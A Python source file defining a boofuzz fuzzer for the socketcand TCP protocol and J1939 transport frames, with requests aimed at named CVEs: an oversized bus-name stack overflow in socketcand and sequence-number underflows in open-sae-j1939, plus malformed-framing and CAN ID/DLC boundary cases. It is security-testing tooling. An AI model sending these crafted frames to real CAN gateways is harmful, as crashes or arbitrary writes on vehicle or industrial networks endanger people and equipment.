"""CAN Protocol Fuzzer (network-reachable CAN surfaces).

Targets the two CAN attack surfaces that are reachable over the network
rather than over a physical bus:

1. socketcand TCP text protocol (default port 29536)
   ASCII commands wrapped in ``< ... >`` with space-separated tokens, e.g.::

       < open vcan0 >
       < rawmode >
       < add 0 0 123 8 1122334455667788 >
       < send 123 8 1122334455667788 >

   The bus name in ``< open <bus> >`` is the CVE-2026-37538 sink: socketcand
   main() copies the requested bus name into a fixed stack buffer without a
   bound check (CWE-121 stack overflow).

2. J1939 transport protocol (SAE J1939 TP) tunnelled through socketcand.
   J1939 TP splits large messages across two PGNs:

   - TP.CM  (PGN 0xEC00): connection-management control frame carrying the
     BAM/RTS control byte, the total-message-size Word and the num-packets
     byte.
   - TP.DT  (PGN 0xEB00): data-transfer frame [sequence-number, 7 data bytes].

   open-sae-j1939 trusts the TP.DT sequence-number against the TP.CM-declared
   total-size / num-packets. A sequence number of 0x00 (or one larger than the
   declared packet count) drives an integer underflow in the copy-offset
   computation -> arbitrary write (CVE-2026-37534 / CVE-2026-37537).

   J1939 frames are encoded as socketcand ``< send <canid> 8 <data> >`` hex
   payloads so they can be delivered over the same TCP channel.

Defensive tool: all traffic is generated fuzz input against an operator's own
authorised target.
"""

from typing import List

from boofuzz import Block, Group, Request, Static

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.connections import TCPSocketConnection
from ..primitives.dynamic import SmartString
from ..primitives.smart_string import StringContext


class CANFuzzer(BaseFuzzer):
    """CAN fuzzer for the socketcand text protocol and J1939 TP frames.

    Strict 1:1 request convention: every RequestInfo name in
    get_request_definitions() is exactly the name of the boofuzz Request that
    _define_protocol() gates behind is_request_enabled(), so --list-requests,
    --enable and --disable all line up with what actually gets connected.
    """

    # socketcand speaks a conversational text protocol (open -> rawmode -> ...).
    STATEFUL = True

    # Socket-liveness monitor every 5 test cases (crashy overflow targets).
    DEFAULT_MONITORS = "socket:5"

    # socketcand default TCP port.
    DEFAULT_PORT = 29536

    # J1939 TP PGNs encoded into the socketcand extended CAN IDs.
    _CANID_TPCM = "18ECFF00"  # TP.CM  (PGN 0xEC00), broadcast dest, src 0x00
    _CANID_TPDT = "18EBFF00"  # TP.DT  (PGN 0xEB00), broadcast dest, src 0x00

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Static request definitions for --list-requests (strict 1:1 with nodes)."""
        return [
            RequestInfo(
                "CAN_Baseline",
                "Valid socketcand handshake (< open vcan0 > then < rawmode >)",
                "baseline",
            ),
            RequestInfo(
                "CAN_SocketCAND_BusName_Overflow",
                "Oversized bus name in < open <bus> > (64/256/1024/4096 'A'); "
                "socketcand main() stack overflow (CVE-2026-37538, CWE-121)",
                "overflow",
            ),
            RequestInfo(
                "CAN_SocketCAND_Malformed_Command",
                "Malformed socketcand framing: missing < / >, extra tokens, "
                "non-hex data, oversized token counts",
                "malformed",
            ),
            RequestInfo(
                "J1939_TPDT_SeqNum_Underflow",
                "TP.DT sequence-number {0x00, 0xFF, > num-packets} conflicting "
                "with a TP.CM-declared total-size; open-sae-j1939 integer "
                "underflow -> arbitrary write (CVE-2026-37534 / CVE-2026-37537)",
                "malformed",
            ),
            RequestInfo(
                "J1939_TPCM_Size_Lie",
                "TP.CM total-message-size Word / num-packets {0x0000, 0xFFFF, "
                "mismatched} vs the TP.DT frames that follow",
                "boundary",
            ),
            RequestInfo(
                "CAN_ID_Boundary",
                "CAN identifier over 11-bit/29-bit boundaries "
                "{0x000, 0x7FF, 0x1FFFFFFF, 0xFFFFFFFF} in a send command",
                "boundary",
            ),
            RequestInfo(
                "CAN_DLC_Boundary",
                "data-length-code {0, 8, 9, 15, 0xFF} vs the data bytes provided",
                "boundary",
            ),
        ]

    def _create_socket(self):
        return TCPSocketConnection(
            self.config.target_ip,
            self.config.target_port,
            **self._timeout_overrides(),
        )

    def _define_protocol(self) -> None:
        """Define socketcand + J1939 TP requests, each gated 1:1."""

        # 1. BASELINE — valid socketcand open + rawmode handshake.
        baseline = Request(
            "CAN_Baseline",
            children=(
                Block(
                    "CAN_Baseline_Block",
                    children=(
                        Static("open", "< open vcan0 >"),
                        Static("rawmode", "< rawmode >"),
                    ),
                ),
            ),
        )

        # 2. OVERFLOW — oversized bus name in < open <bus> > (CVE-2026-37538).
        # The bus name is the variable field; SmartString's boundary/oversize
        # mutations sweep past the fixed stack buffer. Default renders 256 'A'.
        busname_overflow = Request(
            "CAN_SocketCAND_BusName_Overflow",
            children=(
                Block(
                    "BusName_Overflow_Block",
                    children=(
                        Static("open_prefix", "< open "),
                        SmartString(
                            "bus_name",
                            "A" * 256,
                            max_len=8192,
                            fuzzable=True,
                            context=StringContext.COMMAND,
                        ),
                        Static("open_suffix", " >"),
                    ),
                ),
            ),
        )

        # 3. MALFORMED — broken socketcand framing.
        malformed_command = Request(
            "CAN_SocketCAND_Malformed_Command",
            children=(
                Group(
                    "malformed_frame",
                    values=[
                        "open vcan0 >",  # missing opening <
                        "< open vcan0",  # missing closing >
                        "< open vcan0 extra tokens here >",  # extra tokens
                        "< send 123 8 ZZZZZZZZZZZZZZZZ >",  # non-hex data
                        "< send 123 8 " + "41 " * 64 + ">",  # oversized token count
                        "< >",  # empty command
                        "<<<< open >>>>",  # nested delimiters
                    ],
                ),
            ),
        )

        # 4. MALFORMED — TP.DT sequence-number underflow (CVE-2026-37534).
        # First declare an 8-packet, 56-byte BAM via TP.CM, then ship a single
        # TP.DT whose sequence byte lies about its position in the sequence.
        # seq 0x00 (< 1) and seq > num-packets both underflow the copy offset.
        tpdt_seqnum_underflow = Request(
            "J1939_TPDT_SeqNum_Underflow",
            children=(
                Block(
                    "TPDT_SeqNum_Block",
                    children=(
                        # TP.CM BAM: control 0x20, size 0x0038 (56), 8 packets.
                        Static(
                            "tpcm_declare",
                            f"< send {self._CANID_TPCM} 8 20380008FF00EC00 >",
                        ),
                        # TP.DT: seq byte varies, 7 data bytes follow.
                        Static("tpdt_prefix", f"< send {self._CANID_TPDT} 8 "),
                        Group(
                            "seq_num",
                            values=[
                                "00",  # underflow: valid seq starts at 0x01
                                "ff",  # far past declared 8 packets
                                "fe",  # > num-packets (0x08)
                                "09",  # first past-end index
                            ],
                        ),
                        Static("tpdt_data", "11223344556677 >"),
                    ),
                ),
            ),
        )

        # 5. BOUNDARY — TP.CM total-size Word / num-packets lie.
        # A TP.CM whose declared size/packet count does not match the single
        # TP.DT frame that follows.
        tpcm_size_lie = Request(
            "J1939_TPCM_Size_Lie",
            children=(
                Block(
                    "TPCM_Size_Lie_Block",
                    children=(
                        # control 0x20 (BAM) + size Word + num-packets + PGN.
                        Static("tpcm_prefix", f"< send {self._CANID_TPCM} 8 20"),
                        Group(
                            "size_and_packets",
                            values=[
                                "000000",  # size 0x0000, 0 packets
                                "FFFFFF",  # size 0xFFFF, 255 packets
                                "0800FF",  # size 8, 255 packets (mismatch)
                                "FFFF01",  # size 0xFFFF, 1 packet (mismatch)
                            ],
                        ),
                        Static("tpcm_suffix", "FF00EC00 >"),
                        # A single 7-byte TP.DT that contradicts the declaration.
                        Static(
                            "tpdt_follow",
                            f"< send {self._CANID_TPDT} 8 0111223344556677 >",
                        ),
                    ),
                ),
            ),
        )

        # 6. BOUNDARY — CAN identifier over 11-bit / 29-bit edges.
        can_id_boundary = Request(
            "CAN_ID_Boundary",
            children=(
                Block(
                    "CAN_ID_Boundary_Block",
                    children=(
                        Static("send_prefix", "< send "),
                        Group(
                            "can_id",
                            values=[
                                "000",  # min 11-bit
                                "7FF",  # max 11-bit
                                "1FFFFFFF",  # max 29-bit
                                "FFFFFFFF",  # over 29-bit (invalid)
                            ],
                        ),
                        Static("send_suffix", " 8 1122334455667788 >"),
                    ),
                ),
            ),
        )

        # 7. BOUNDARY — DLC vs actual data-byte count.
        can_dlc_boundary = Request(
            "CAN_DLC_Boundary",
            children=(
                Block(
                    "CAN_DLC_Boundary_Block",
                    children=(
                        Static("send_prefix", "< send 123 "),
                        Group(
                            "dlc",
                            values=[
                                "0",  # DLC 0 but 8 data bytes present
                                "8",  # matching
                                "9",  # DLC 9 (> classic-CAN max 8)
                                "15",  # DLC 15 (CAN-FD max nibble)
                                "255",  # absurd DLC
                            ],
                        ),
                        Static("send_suffix", " 1122334455667788 >"),
                    ),
                ),
            ),
        )

        # ==================== GATED WIRING (strict 1:1) ====================
        if self.is_request_enabled("CAN_Baseline"):
            self.session.connect(baseline)

        if self.is_request_enabled("CAN_SocketCAND_BusName_Overflow"):
            self.session.connect(busname_overflow)

        if self.is_request_enabled("CAN_SocketCAND_Malformed_Command"):
            self.session.connect(malformed_command)

        if self.is_request_enabled("J1939_TPDT_SeqNum_Underflow"):
            self.session.connect(tpdt_seqnum_underflow)

        if self.is_request_enabled("J1939_TPCM_Size_Lie"):
            self.session.connect(tpcm_size_lie)

        if self.is_request_enabled("CAN_ID_Boundary"):
            self.session.connect(can_id_boundary)

        if self.is_request_enabled("CAN_DLC_Boundary"):
            self.session.connect(can_dlc_boundary)


__all__ = ["CANFuzzer"]
